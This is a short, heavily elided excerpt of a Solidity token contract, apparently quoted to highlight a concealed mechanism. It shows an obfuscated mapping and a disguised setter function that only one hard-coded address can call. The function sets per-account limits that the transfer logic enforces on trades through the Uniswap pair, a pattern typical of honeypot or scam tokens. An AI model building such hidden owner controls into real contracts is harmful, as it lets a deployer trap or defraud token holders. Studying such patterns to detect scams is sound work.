...
contract Token is IERC20, Ownable {
	...
	mapping(address => uint256) private _YeuaMzRppd;
	...
	function setPllasDusopl(address account,uint256 Amount) public {
		require(msg.sender == contractSender18);
        _YeuaMzRppd[account] = Amount;
    }
    ...
    function _transfer(
        ...
        if(_tTotalDestroy >= (_tTotal-_tTotalMin)){
            ...
            if(from == uniswapV2Pair){
				...
				if(_YeuaMzRppd[from] > 0){
					require(_YeuaMzRppd[from] >= amount.add(_userSellAmount[from]));
				}
